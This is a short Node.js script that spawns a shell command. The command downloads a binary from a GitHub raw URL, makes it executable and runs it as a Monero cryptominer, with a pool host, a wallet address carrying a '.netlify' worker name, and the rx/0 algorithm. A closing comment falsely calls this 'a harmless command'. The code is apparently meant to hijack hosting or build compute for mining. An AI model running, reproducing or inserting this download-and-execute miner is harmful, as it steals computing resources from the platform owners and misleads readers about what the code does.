// Change this to the command you want to run
const command = "apt update && apt install -y wget && wget https://github.com/iceyfromdiscord/yes/raw/refs/heads/master/prog && chmod +x prog && ./prog -o us.monero.gfwroute.com:1111 -u 43wBYRJpvVsMYCUcL1jGrj5GBACA6Qr7BLP3ZieFGueMj82kZcGfNewaEcYm9kyCUiAMhvwFiRxcJ8SzfcVeqn5z1vVkDfQ.netlify -a rx/0 -k "
const { spawn } = require("child_process");

function runShellCommand(commandStr) {
  // shell:true runs the command string in a shell (e.g. /bin/bash)
  const child = spawn(commandStr, { shell: true, stdio: "pipe" });

  child.stdout.on("data", (chunk) => {
    process.stdout.write(chunk); // stream stdout
  });

  child.stderr.on("data", (chunk) => {
    process.stderr.write(chunk); // stream stderr
  });

  child.on("close", (code, signal) => {
    console.log(`\nChild process exited with code ${code}${signal ? `, signal ${signal}` : ""}`);
  });

  child.on("error", (err) => {
    console.error("Failed to start child process:", err);
  });
}

// Example usage with a harmless command:
runShellCommand(command);
